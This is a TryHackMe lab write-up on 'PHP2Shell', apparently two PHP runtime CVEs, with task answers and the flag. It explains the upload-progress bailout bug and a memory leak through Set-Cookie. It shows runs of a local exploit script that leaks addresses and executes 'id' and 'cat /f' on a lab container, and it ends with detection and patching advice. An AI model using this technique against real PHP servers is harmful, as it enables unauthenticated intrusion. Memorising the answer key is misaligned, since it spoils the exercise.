# TryHackMe: PHP2Shell

**Platform:** TryHackMe 

**Room:** [CVE: PHP2Shell](https://tryhackme.com/room/cvephp2shell)

**Difficulty:** Easy

**Focus:** Exploit the PHP2Shell runtime CVEs via session.upload_progress for unauthenticated RCE.

**⚠️Disclaimer:** This writeup contains direct answers to task questions, step-by-step solutions, and the final flag.

---

## 📑 Table of Contents

- [Setup & Connection](#setup--connection)
- [Task 1: Introduction](#task-1-introduction)
- [Task 2: A Harmless Feature: Upload Progress](#task-2-a-harmless-feature-upload-progress)
- [Task 3: The Bug: A Bailout at the Wrong Moment](#task-3-the-bug-a-bailout-at-the-wrong-moment)
- [Task 4: Reconnaissance: Confirming the Target](#task-4-reconnaissance-confirming-the-target)
- [Task 5: Leaking Memory and Defeating ASLR (CVE-2026-109618)](#task-5-leaking-memory-and-defeating-aslr-cve-2026-109618)
- [Task 6: From a Leak to a Shell (CVE-2026-109619)](#task-6-from-a-leak-to-a-shell-cve-2026-109619)
- [Task 7: Detection, Mitigation and the Real Fix](#task-7-detection-mitigation-and-the-real-fix)
- [Task 8: Conclusion](#task-8-conclusion)

---

## Setup & Connection

First, connect to the TryHackMe network using OpenVPN, then SSH into the target machine.

Connect to the VPN:
```bash
sudo openvpn <your_configuration_file>.ovpn
```

SSH into the lab machine with the provided credentials (`ubuntu` / `tryhackme`):
```bash
ssh ubuntu@10.128.187.255
```
```text
The authenticity of host '10.128.187.255 (10.128.187.255)' can't be established.
ED25519 key fingerprint is: SHA256:IZDpaCZ2FYVTgEViTmOgxaXkh7iBefYsKVPD2nPDCUk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.128.187.255' (ED25519) to the list of known hosts.
ubuntu@10.128.187.255's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com/
 * Management:     https://landscape.canonical.com/
 * Support:        https://ubuntu.com/pro

 System information as of Sat Oct 24 13:39:09 UTC 2026

  System load:  0.24               Temperature:           -273.1 C
  Usage of /:   14.2% of 24.16GB   Processes:             126
  Memory usage: 19%                Users logged in:       1
  Swap usage:   0%                 IPv4 address for ens5: 10.128.187.255

Last login: Sat Oct 24 13:37:32 2026 from 10.128.120.72
ubuntu@tryhackme-2404:~$ 
```

---

## Task 1: Introduction

On 21 October 2026 the PHP project disclosed two vulnerabilities that, between them, let an unauthenticated attacker run commands on almost any PHP server with nothing but ordinary requests. No login, no file upload the application accepts, and no bug in the application itself: the flaw lives in the PHP runtime, below whatever framework or CMS happens to be installed. The disclosure was named **PHP2Shell**, and because the vulnerable code has been present since PHP 5.4.0 in 2012, it reaches fourteen years of releases at once.

The two issues are tracked as **CVE-2026-109618** and **CVE-2026-109619**, both scored **9.2 Critical on CVSS v4.0**. They were found by researchers at Wiz, OpenAI and Calif, reported privately to the PHP security team, and patched in PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35. Details leaked a day before the fix, and network sensors recorded exploitation attempts within hours of disclosure, so this is a live threat rather than a theoretical one.

This room takes you through the vulnerability from the ground up. You will see the harmless PHP feature it abuses, understand the single mistake in the engine that turns that feature into a weapon, and then run a working exploit against a vulnerable server in the lab to read a flag as the web server user. The focus throughout is on why the bug exists and why patching the application does nothing to stop it.

### Connecting to the Lab

The machine runs a vulnerable copy of PHP (8.4.26) behind Apache, served from a container that listens on `127.0.0.1:8088`, so you attack it from a shell on the machine itself rather than across the network. Everything you need is already on the machine: the vulnerable server is running, and the exploit is in the ubuntu user's home directory.

---

## Task 2: A Harmless Feature: Upload Progress

Every vulnerability abuses something that was built to be useful, and this one is no exception. Before looking at the bug, it is worth understanding the feature it stands on, because the feature is where the attacker's reach comes from.

When a browser uploads a large file, the server has no simple way to tell the page how far the upload has got. PHP solves this with a feature called `session.upload_progress`. While PHP is still reading a multipart/form-data request body off the wire, it writes a running description of the upload, its name, its size and how many bytes have arrived so far, into the user's `$_SESSION`. A second request can then read that session data and report progress back to the browser. The feature is enabled by default, and it is switched on for a given upload by including a form field whose name matches the `session.upload_progress.name` setting, which defaults to `PHP_SESSION_UPLOAD_PROGRESS`.

The detail that matters is when this happens. Parsing the request body is one of the first things PHP does, long before it initialises the request environment and long before it compiles and runs the script the URL points at. The progress updates are written from inside the body-parsing callbacks, so they occur before any application code executes. That has a consequence the feature's designers never intended to expose: reaching this code needs no `session_start()` in the target page, no valid login, and in fact no application logic at all. Any URL on the server that accepts a POST request is enough, even one whose script does nothing but print a single line.

This pre-execution window is the foothold. The whole of PHP2Shell happens inside it, driven entirely by what the attacker puts in an ordinary multipart upload, while the application that owns the server is still fast asleep.

**What is the default name of the form field that switches on PHP's upload-progress tracking?**
> ✅ **Answer:** `PHP_SESSION_UPLOAD_PROGRESS`

---

## Task 3: The Bug: A Bailout at the Wrong Moment

The upload-progress feature is not itself the vulnerability. The vulnerability is what happens when PHP runs out of memory while that feature is in the middle of its work, and to see it you need to know how PHP handles a fatal error.

PHP caps how much memory a single request may use with the `memory_limit` setting. When a request tries to exceed it, PHP cannot simply carry on, so it performs what the engine calls a **bailout**: it uses a `longjmp()` to jump straight back to a safe recovery point, abandoning whatever it was doing. This is the mechanism behind the familiar "Allowed memory size exhausted" fatal error. Normally a request tidies up after itself, freeing memory and clearing the pointers that referred to it, but a bailout skips all of that. It is an emergency exit, not an orderly shutdown.

The flaw is a matter of timing. If the out-of-memory condition strikes after the engine has freed a block of memory but before it has cleared the pointer that still refers to that block, the bailout leaves the pointer behind, pointing at memory that is no longer valid. This is a classic dangling pointer, classified as **CWE-824: Access of Uninitialised Pointer**.

On its own, a dangling pointer in a request that has just died would be harmless, because the request is over. What makes it dangerous is the server model. Under Apache's prefork configuration with `mod_php`, a single worker process serves one request after another without restarting between them. The stale pointer therefore does not vanish with the failed request; it stays in the worker's memory, and the next request to land on that same worker finds the engine reaching through a pointer it never reset. An attacker who controls what gets allocated into that freed space in the second request controls what the pointer now points at.

From this single defect the researchers built two distinct attacks, which is why PHP2Shell carries two CVE numbers. **CVE-2026-109618** is a memory-disclosure flaw: the stale pointer is read back as a string with an attacker-influenced, oversized length, and PHP returns the result in a response header, handing the attacker a window into the worker's memory. **CVE-2026-109619** is the remote-code-execution flaw, which turns the corrupted state into control over the program's flow. The PHP changelog addresses both with a single description, "Avoid state corruption via bailout", which names the root cause precisely.

**What one-word name does the PHP engine give to the longjmp it performs to abort a request that hits a fatal error such as running out of memory?**
> ✅ **Answer:** `bailout`

**What is the CWE identifier for the weakness class behind PHP2Shell? (format: CWE-NNN)**
> ✅ **Answer:** `CWE-824`

---

## Task 4: Reconnaissance: Confirming the Target

With the machine started and an SSH session open as the `ubuntu` user, the first job is to confirm what you are dealing with. Everything in this room runs from the machine itself against the vulnerable server on `127.0.0.1:8088`.

The vulnerable server runs as a container. List it and read the PHP version it ships:
```bash
ubuntu@tryhackme-2404:~$ docker ps --format '{{.Names}}  {{.Image}}  {{.Status}}'
```
```text
php2shell-target  php:8.4.26-apache  Up 13 minutes
```

```bash
ubuntu@tryhackme-2404:~$ docker exec php2shell-target php -v
```
```text
PHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
Copyright (c) The PHP Group
Built by https://github.com/docker-library/php
Zend Engine v4.4.26, Copyright (c) Zend Technologies
    with Zend OPcache v8.4.26, Copyright (c), by Zend Technologies
```

The server is PHP 8.4.26, one release short of the 8.4.27 fix, so it is vulnerable. Now look at the page you will be attacking:
```bash
ubuntu@tryhackme-2404:~$ curl -s http://127.0.0.1:8088/index.php
```
```text
OK
```

```bash
ubuntu@tryhackme-2404:~$ docker exec php2shell-target cat /var/www/html/index.php
```
```text
<?php echo "OK\n"; ?>
```

The entire application is one line that prints `OK`. There is no login form, no file upload, no database, and certainly no bug in this code to exploit. That is the point worth pausing on: if the attack works against this page, it works against the **runtime**, not the application, and a real target such as a WordPress or Laravel site is no better protected simply because its own code is sound.

The server runs the ordinary prefork mod_php setup with `session.upload_progress` enabled as it is by default. For the lab it is cut down to a single worker, and `memory_limit` is set low, so the dangling pointer is reliably reused and the out-of-memory condition is easy to provoke. The exploit you will use is already on the machine:
```bash
ubuntu@tryhackme-2404:~$ ls ~/php2shell-bypass-aslr-exp
```
```text
ASLR_PATHS.md               NOASLR_REPORT.md      docker      out
ASLR_PURE_HTTP.md           NOTES.md              e.py        readme_en.md
ASLR_PURE_HTTP_RESEARCH.md  NOTES_BG.md           exploit.py  src
DISPLAY_ERRORS_OFF.md       NO_DISPLAY_ERRORS.md  lab         tools
HTTP_HEAP_LEAK.md           README.md             logs
```

**What version of PHP is the target server running?**
> ✅ **Answer:** `8.4.26`

**What single word does the target page at /index.php print in response?**
> ✅ **Answer:** `OK`

---

## Task 5: Leaking Memory and Defeating ASLR (CVE-2026-109618)

Modern systems load code and data at randomised addresses, a defence called Address Space Layout Randomisation (ASLR). An attacker who wants to redirect execution has to know where things actually are in memory, and ASLR is meant to deny that knowledge. CVE-2026-109618 removes it, by turning the dangling pointer into a leak of the worker's own memory.

The mechanism reuses the bailout from the previous task. An out-of-memory condition is provoked while a session identifier is being handled, which leaves a stale pointer to the session id. A following request reoccupies that freed space so the stale pointer now describes a string whose length the attacker has inflated far beyond the real data. When PHP sends the `Set-Cookie: PHPSESSID` response header, it reads that oversized session-id string and returns it to the client. The header now carries whatever happened to sit in the worker's memory after the string, which the research measured at up to roughly 67 KB of process memory per request. In a real deployment that memory can hold other users' passwords, session cookies, keys, and even private keys; for the exploit, it holds the addresses it needs.

The exploit runs this leak twice. The first pass discloses the base address of PHP's memory heap, and the second discloses the base address of the PHP library (`libphp`) by reading a pointer whose offset into the library is known. Between them, the two leaks tell the attacker exactly where the heap and the engine's own code live in this specific worker, which is all that was missing to defeat ASLR.

Let's run the exploit and watch both leaks happen:
```bash
ubuntu@tryhackme-2404:~$ cd ~/php2shell-bypass-aslr-exp
ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php
```
```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7bdf39000000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7bdf3ad5b000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7bdf390690d8 ZIF=0x7bdf3b1c0370
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The two `[+]` lines are the disclosure: the heap chunk base and the libphp base, each read straight out of a `Set-Cookie` header. The addresses differ on every run, which is ASLR doing its job; the attack simply reads them out each time rather than guessing them.

**Which HTTP response header does CVE-2026-109618 abuse to return leaked process memory to the attacker?**
> ✅ **Answer:** `Set-Cookie`

---

## Task 6: From a Leak to a Shell (CVE-2026-109619)

The leak told the attacker where everything is. CVE-2026-109619 is what turns that knowledge into a command running on the server. It works by reoccupying the freed memory not with data to read, but with a carefully forged object that hijacks the engine's own clean-up machinery.

When PHP destroys a value, it may call a function pointer stored alongside it, a **destructor**, to release the value's resources. The exploit reoccupies the dangling reference with a forged internal structure (a `HashTable`) whose destructor pointer, `pDestructor`, has been set to the address of `system()` inside the PHP library, an address the leak in the previous task made known. When the engine tidies up that value at the end of request handling, it believes it is calling a harmless destructor and instead calls `system()` with attacker-controlled bytes as its argument. The command runs as the web server user. Nothing in the attack needs the C library or any gadget outside PHP itself; the whole finish is built from the engine's own code.

The full chain: rotate the worker, leak the heap base, leak the libphp base to defeat ASLR, then forge a HashTable whose destructor points at `system()` so cleanup executes the attacker's command as the web user.

Running the exploit with no command argument performs the whole chain and proves execution by running `id` on the target:
```bash
ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php
```
```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7bdf39000000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7bdf3ad5b000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7bdf390690d8 ZIF=0x7bdf3b1c0370
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is remote code execution, from nothing but multipart POST requests to a page that prints `OK`, against a server with no application vulnerability of any kind. The whole chain completes in under ten seconds.

**When the exploit runs, which system user do the commands execute as?**
> ✅ **Answer:** `www-data`

### Retrieving the Flag

To retrieve the flag, run a command of your own. The payload that carries it is tiny, with only fourteen bytes for the command and its redirection, so the flag is exposed at the short path `/f` on the target. The command below reads it into the shared `out` directory, which the tool then prints back:
```bash
ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'cat /f>/out/p1' --proof-file out/p1
```
```text
[*] target http://127.0.0.1:8088/index.php (cmd='cat /f>/out/p1')
[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7bdf39000000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7bdf3ad5b000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7bdf390690d8 ZIF=0x7bdf3b1c0370
[+] W3 attempt 1
PROOF: THM{b4ilout_l3aves_th3_h3ap_dang1ing}
```

If a run ever stops short at the leak stage, simply run it again; the corruption is probabilistic, and the exploit retries the fragile stages for you.

**What is the flag returned by the exploit?**
> ✅ **Answer:** `THM{b4ilout_l3aves_th3_h3ap_dang1ing}`

---

## Task 7: Detection, Mitigation and the Real Fix

Because PHP2Shell lives in the runtime, the instinct to "update the website" misses it entirely. Updating WordPress, Drupal, Joomla or Laravel changes the application; the vulnerable code is in PHP, underneath all of them. The only complete fix is to patch the PHP runtime itself, by updating the PHP package your distribution ships or the base image your PHP is built from, to **8.5.12, 8.4.27, 8.3.36 or 8.2.35**, and then restarting every worker so no process keeps running the old code.

Until that patch can be applied, several interim measures reduce exposure, though the PHP team is clear that none is a complete substitute for patching:
- Disabling the feature the attack relies on, by setting `session.upload_progress.enabled = 0` and restarting all workers, removes the trigger for most of the reported techniques.
- Turning off the opcode cache with `opcache.enable = 0` frustrates the code-execution path.
- On PHP 8.5, `fatal_error_backtraces = 0` addresses CVE-2026-109619 specifically.
- At the network edge, rejecting `multipart/form-data` requests blocks the delivery mechanism, at the cost of breaking legitimate file uploads.
- Running the PHP process with least privilege limits what an attacker gains if the chain does land.

One defence that does not help is worth calling out. A web application firewall that runs as a PHP module inspects traffic only once PHP hands control to the application, but this attack does its damage before the application ever runs. The malicious work is complete while the request is still being parsed, so an in-process filter never gets the chance to see it. Protection has to sit either in the patched runtime or at a layer in front of PHP.

For detection, the attack leaves distinctive marks. The disclosure path produces abnormally large `PHPSESSID` values in `Set-Cookie` response headers, which stand out sharply against the fixed-length identifiers PHP normally issues. The delivery requests are large multipart POST bodies with very high field counts that carry the `PHP_SESSION_UPLOAD_PROGRESS` field, and the memory exhaustion that drives the bug shows up as PHP worker crashes and out-of-memory errors in the logs. Any of these, and especially the combination, is worth alerting on while patching is in progress.

**Which PHP 8.4 release fixes PHP2Shell?**
> ✅ **Answer:** `8.4.27`

**Which php.ini directive, set to 0, disables the feature the attack relies on for delivery?**
> ✅ **Answer:** `session.upload_progress.enabled`

---

## Task 8: Conclusion

PHP2Shell is a reminder that the software stack does not stop at the application. A single mistake in how the engine recovered from running out of memory, present and unnoticed since 2012, exposed an unauthenticated path to code execution on a large share of the web's servers at once, independent of which framework or CMS sat on top.

The lesson for defenders is to treat the runtime as part of the attack surface and to patch it with the same urgency as the application, because a flaw this deep cannot be reached by securing the layers above it. In this room you saw the harmless upload-progress feature that gave the attack its pre-authentication foothold, the memory bailout that left a pointer dangling into the next request, the memory disclosure that read the server's own addresses out of a cookie header to defeat ASLR, and the forged destructor that finished the job as remote code execution.

If you would like to go deeper, read the engine internals in PHP's own advisories, GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp, and compare this class of bug with the memory-safety issues you may have met in compiled languages. The underlying weakness, a pointer used after the thing it pointed to was gone, is the same story told in a new setting.
